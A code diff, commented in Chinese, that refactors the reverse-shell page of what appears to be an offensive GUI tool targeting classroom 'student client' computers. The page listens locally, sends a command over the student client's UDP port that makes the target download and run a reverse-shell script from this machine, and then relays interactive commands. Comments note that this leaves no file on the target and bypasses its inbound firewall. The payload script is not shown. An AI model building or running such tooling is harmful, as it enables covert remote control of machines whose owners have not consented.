@@ -3,110 +3,85 @@
 from PySide6.QtCore import Qt, QTimer
 from PySide6.QtGui import QFont, QTextCursor
 from PySide6.QtWidgets import QHBoxLayout, QLineEdit
-from qfluentwidgets import BodyLabel, PlainTextEdit, PushButton
+from qfluentwidgets import BodyLabel, CaptionLabel, PlainTextEdit, PushButton
 from qfluentwidgets import FluentIcon as FIF
 
 import app.features.shell.service as shell_service
-from app.gui.widgets.common import SectionCard, page_heading
+from app.gui.widgets.common import SectionCard, TargetControls, page_heading
 from app.gui.widgets.page import Page
 
 # 轮询间隔：既不会让输出看起来一顿一顿，也不至于空转占满 CPU。
 POLL_INTERVAL = 120
-# 控制台高度固定，避免内容把整页撑高，也避免输入行被挤出窗口。
-CONSOLE_HEIGHT = 320
+# 控制台最小高度：窗口再矮也留出能看清几行输出的空间。
+CONSOLE_MIN_HEIGHT = 260
 
 
 class ShellPage(Page):
     """监听目标回连并提供交互式命令行。
 
     远端只执行一条很短的下载命令，真正的反弹脚本由本机 HTTP 服务提供，
-    因此不需要在目标上留文件，也不依赖任何第三方短链。
+    因此不需要在目标上留文件，也不依赖任何第三方短链。目标与其他远程
+    攻击页面共用，本机地址与监听端口由程序自动选择，页面上不再重复填写。
     """
 
-    def __init__(self, logs, parent=None):
+    def __init__(self, state, logs, parent=None):
         super().__init__("shell", parent)
+        self.state = state
         self.logs = logs
         self.server = None
         # 记录上一次的连接状态与来源，只在状态变化时写日志。
         self._connected = False
         self._address = ""
         page_heading(self.vbox, "反弹终端")
-        self.vbox.addWidget(
-            BodyLabel("远程攻击：目标主动连回本机，得到一条可持续交互的命令行。", self)
-        )
-
-        card = SectionCard(self)
         hint = BodyLabel(
-            "点“开始监听”会在本机开一个端口，“发送连接命令”再通过远程命令"
-            "通道让目标下载并执行反弹脚本。目标是主动外连，所以不受它自己的"
-            "入站防火墙限制；代价是目标必须能访问到本机地址。",
-            card,
+            "远程攻击：目标主动连回本机，得到一条可持续交互的命令行。", self
         )
-        # 说明是一整段话，必须换行，否则会顶出卡片右侧被裁掉。
         hint.setWordWrap(True)
-        card.body.addWidget(hint)
+        self.vbox.addWidget(hint)
 
-        target_row = QHBoxLayout()
-        target_row.addWidget(BodyLabel("目标地址", card))
-        self.target_input = QLineEdit(card)
-        self.target_input.setPlaceholderText("例如 10.1.1.5")
-        self.target_input.setMinimumWidth(220)
-        target_row.addWidget(self.target_input)
-        target_row.addSpacing(12)
-        target_row.addWidget(BodyLabel("学生端端口", card))
-        self.udp_port_input = QLineEdit("4705", card)
-        self.udp_port_input.setMaximumWidth(110)
-        target_row.addWidget(self.udp_port_input)
-        target_row.addStretch()
-        card.body.addLayout(target_row)
+        # 目标与端口来自远程攻击共用的连接状态，和其它页面保持一致。
+        self.target_card = SectionCard(self)
+        self.targets = TargetControls(state, self.target_card, show_round_options=False)
+        self.target_card.body.addWidget(self.targets)
+        self.vbox.addWidget(self.target_card)
 
-        local_row = QHBoxLayout()
-        local_row.addWidget(BodyLabel("本机地址", card))
-        self.local_input = QLineEdit(card)
-        self.local_input.setPlaceholderText("目标回连时使用的本机 IP")
-        self.local_input.setMinimumWidth(220)
-        local_row.addWidget(self.local_input)
-        local_row.addSpacing(12)
-        local_row.addWidget(BodyLabel("监听端口", card))
-        self.port_input = QLineEdit("0", card)
-        self.port_input.setMaximumWidth(110)
-        self.port_input.setToolTip("0 表示随机挑一个空闲端口")
-        local_row.addWidget(self.port_input)
-        local_row.addStretch()
-        card.body.addLayout(local_row)
-
-        button_row = QHBoxLayout()
-        self.listen_button = PushButton(FIF.CONNECT, "开始监听", card)
+        self.terminal_card = SectionCard(self, spacing=10)
+        toolbar = QHBoxLayout()
+        toolbar.setSpacing(8)
+        toolbar.addWidget(BodyLabel("终端会话", self.terminal_card))
+        toolbar.addStretch()
+        self.listen_button = PushButton(FIF.CONNECT, "开始监听", self.terminal_card)
+        self.listen_button.setMinimumHeight(34)
         self.listen_button.clicked.connect(self.toggle_listen)
-        self.send_button = PushButton(FIF.SEND, "发送连接命令", card)
-        self.send_button.clicked.connect(self.send_connect_command)
-        button_row.addWidget(self.listen_button)
-        button_row.addWidget(self.send_button)
-        button_row.addStretch()
-        card.body.addLayout(button_row)
+        toolbar.addWidget(self.listen_button)
+        self.link_button = PushButton(FIF.SEND, "发送连接命令", self.terminal_card)
+        self.link_button.setMinimumHeight(34)
+        self.link_button.clicked.connect(self.send_connect_command)
+        toolbar.addWidget(self.link_button)
+        self.terminal_card.body.addLayout(toolbar)
 
-        self.status = BodyLabel("未监听", card)
-        card.body.addWidget(self.status)
+        self.status = CaptionLabel("未监听", self.terminal_card)
+        self.status.setWordWrap(True)
+        self.terminal_card.body.addWidget(self.status)
 
-        self.console = PlainTextEdit(card)
+        self.console = PlainTextEdit(self.terminal_card)
         self.console.setReadOnly(True)
-        # 控制台给固定高度，剩余空间留在底部，窗口拉高时输入行不会被顶到屏幕上沿。
-        self.console.setFixedHeight(CONSOLE_HEIGHT)
+        self.console.setMinimumHeight(CONSOLE_MIN_HEIGHT)
         self.console.setFont(QFont("Consolas", 10))
-        card.body.addWidget(self.console)
+        self.terminal_card.body.addWidget(self.console, 1)
 
         command_row = QHBoxLayout()
-        self.command_input = QLineEdit(card)
+        command_row.setSpacing(8)
         self.command_row = command_row
+        self.command_input = QLineEdit(self.terminal_card)
         self.command_input.setPlaceholderText("连接建立后在这里输入命令，回车发送")
         self.command_input.returnPressed.connect(self.send_line)
         command_row.addWidget(self.command_input, 1)
-        self.command_button = PushButton(FIF.PLAY, "发送", card)
+        self.command_button = PushButton(FIF.PLAY, "发送", self.terminal_card)
         self.command_button.clicked.connect(self.send_line)
         command_row.addWidget(self.command_button)
-        card.body.addLayout(command_row)
-        card.body.addStretch()
-        self.vbox.addWidget(card, 1)
+        self.terminal_card.body.addLayout(command_row)
+        self.vbox.addWidget(self.terminal_card, 1)
 
         # 输出由后台线程写入队列，界面按固定节奏取，避免跨线程碰控件。
         self.timer = QTimer(self)
@@ -114,36 +89,40 @@ class ShellPage(Page):
         self.timer.timeout.connect(self._poll)
         self._set_command_enabled(False)
 
+    # ---- 目标 -------------------------------------------------------------
+
+    def target_host(self):
+        """返回当前共享目标的解析结果，没填时为空字符串。"""
+        value = self.state.values["target"].strip()
+        if not value:
+            return ""
+        try:
+            return self.state.resolve_target(value)
+        except ValueError:
+            return ""
+
+    def udp_port(self):
+        """返回共享状态里的学生端 UDP 端口。"""
+        return int(self.state.values["port"])
+
+    # ---- 监听与连接 -------------------------------------------------------
+
     def toggle_listen(self):
         """开始或停止监听。"""
         if self.server is not None:
             self.stop_listen()
             return
-        try:
-            port = int(self.port_input.text().strip() or "0")
-        except ValueError:
-            self.status.setText("监听端口必须是数字")
-            return
-        server = shell_service.ShellServer(
-            port=port,
-            local_ip=self.local_input.text().strip(),
-            # 带上目标地址，多网卡机器才能挑到目标能回连的那张网卡。
-            target=self.target_input.text().strip() or None,
-        )
+        host = self.target_host()
+        server = shell_service.ShellServer(port=0, local_ip=None, target=host or None)
         try:
             server.start()
         except OSError as error:
-            self.logs.error(
-                "反弹终端", "监听失败", "端口：%d；异常：%s" % (port, error)
-            )
+            self.logs.error("反弹终端", "监听失败", "异常：%s" % error)
             self.status.setText("监听失败：%s" % error)
             return
         self.server = server
-        # 只有真正监听时才探测本机地址：构造页面就联网会让界面启动多等一次。
-        if not self.local_input.text().strip():
-            self.local_input.setText(server.callback_host())
         self.listen_button.setText("停止监听")
-        self.status.setText("监听 %s:%d，等待目标连回" % ("0.0.0.0", server.port))
+        self._refresh_status()
         self._append(
             "已在本机 %s:%d 监听，脚本服务端口 %d\n"
             % (server.callback_host(), server.port, server.http_port)
@@ -176,22 +155,21 @@ class ShellPage(Page):
         if self.server is None:
             self.status.setText("请先开始监听")
             return
-        host = self.target_input.text().strip()
+        host = self.target_host()
         if not host:
-            self.status.setText("请填写目标地址")
+            self.targets.target_input.setError(True)
+            self.targets.target_input.segments[-1].setFocus()
+            self.status.setText("请先填写目标设备")
             return
-        try:
-            udp_port = int(self.udp_port_input.text().strip() or "4705")
-        except ValueError:
-            self.status.setText("学生端端口必须是数字")
-            return
+        # 目标可能刚被改过，让回调地址按新目标重新挑选出口网卡。
+        self.server.target = host
         try:
             command = self.server.command()
         except ValueError as error:
             self.status.setText(str(error))
             return
         try:
-            sent = shell_service.send_command(host, command, port=udp_port)
+            sent = shell_service.send_command(host, command, port=self.udp_port())
         except (OSError, ValueError) as error:
             self.logs.error(
                 "反弹终端", "连接命令发送失败", "目标：%s；异常：%s" % (host, error)
@@ -203,7 +181,8 @@ class ShellPage(Page):
         self.logs.info(
             "反弹终端",
             "发送连接命令",
-            "目标：%s；学生端端口：%d；命令长度：%d 字节" % (host, udp_port, sent),
+            "目标：%s；学生端端口：%d；命令长度：%d 字节"
+            % (host, self.udp_port(), sent),
         )
 
     def send_line(self):
@@ -220,6 +199,19 @@ class ShellPage(Page):
         self.command_input.clear()
         self.logs.debug(
             "反弹终端", "发送命令", "目标：%s；命令：%s" % (self.server.address, text)
+        )
+
+    def _refresh_status(self):
+        """按监听与连接状态写一行摘要。"""
+        if self.server is None:
+            self.status.setText("未监听")
+            return
+        if self.server.connected:
+            self.status.setText("已连接 %s" % self.server.address)
+            return
+        self.status.setText(
+            "监听 0.0.0.0:%d，本机地址 %s，等待目标连回"
+            % (self.server.port, self.server.callback_host())
         )
 
     def _poll(self):
@@ -242,8 +234,7 @@ class ShellPage(Page):
             self._connected = connected
             self._address = self.server.address
         self._set_command_enabled(connected)
-        if connected:
-            self.status.setText("已连接 %s" % self.server.address)
+        self._refresh_status()
 
     def _append(self, text):
         """把文本追加到输出区并滚到末尾。"""
